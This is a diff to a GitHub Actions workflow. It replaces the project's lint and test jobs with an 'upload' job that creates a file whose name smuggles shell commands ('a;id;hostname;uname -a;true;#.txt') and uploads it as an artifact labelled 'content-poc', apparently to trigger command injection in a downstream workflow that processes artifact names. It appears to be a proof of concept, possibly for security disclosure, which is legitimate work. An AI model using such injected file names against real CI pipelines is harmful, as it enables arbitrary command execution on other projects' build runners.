@@ -1,20 +1,19 @@
 name: Test
 
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}
-  cancel-in-progress: true
-
 on:
   pull_request:
-  push:
-    branches: [main]
-
-permissions:
-  contents: write
-  pull-requests: write
 
 jobs:
-  lint:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-lint.yml@main
-  test:
-    uses: bgd-labs/github-workflows/.github/workflows/foundry-test.yml@main
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: build artifact
+        run: |
+          set -e
+          mkdir -p content
+          printf 'marker\n' > content/a
+          printf 'x\n' > 'content/a;id;hostname;uname -a;true;#.txt'
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content-poc      # must match the "content*" regular expression
+          path: content/
